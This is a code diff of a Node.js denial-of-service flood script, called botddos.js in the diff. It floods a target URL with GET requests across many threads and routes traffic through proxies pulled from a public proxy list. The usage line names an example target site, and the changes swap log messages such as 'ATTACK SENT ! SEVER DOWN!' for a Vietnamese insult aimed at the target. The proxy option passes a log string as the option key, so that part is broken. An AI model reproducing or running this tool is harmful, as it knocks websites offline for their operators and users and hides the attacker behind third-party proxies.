@@ -6,7 +6,7 @@ const request = require('request')
       cluster = require('cluster');
 async function poptto() {
     if (process.argv.length !== 6) {
-        console.log(`node POWERFUL.js url times threads proxy/off/proxy.txt`);
+        console.log(`node botddos.js url times threads proxy/off/proxy.txt`);
         console.log(`vi du : node POWERFUL.js https://dangtri.com 120 1000 dmtproxy.txt`);
         process.exit(0);
     }else{
@@ -35,9 +35,9 @@ async function poptto() {
             return this;
         }
         if (process.argv[5] == 'off') {
-            console.log("ATTACK SENT ! SEVER DOWN !")
+            console.log("ATTACK SENT ! SEVER DOWN!")
         } else if (process.argv[5] == 'proxy'){
-            console.log("ATTACK SENT ! SEVER DOWN !")
+            console.log("ATTACK SENT ! SEVER DOWN!")
             const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
             var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
         } else {
@@ -47,7 +47,7 @@ async function poptto() {
         function run() {
             if (process.argv[5] !== 'off') {
                 var proxy = proxies[Math.floor(Math.random() * proxies.length)];
-                var proxiedRequest = request.defaults({'ATTACK SENT ! SEVER DOWN !': 'http://'+proxy});
+                var proxiedRequest = request.defaults({'ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT': 'http://'+proxy});
                 var config = {
                     method: 'get',
                     url: target,
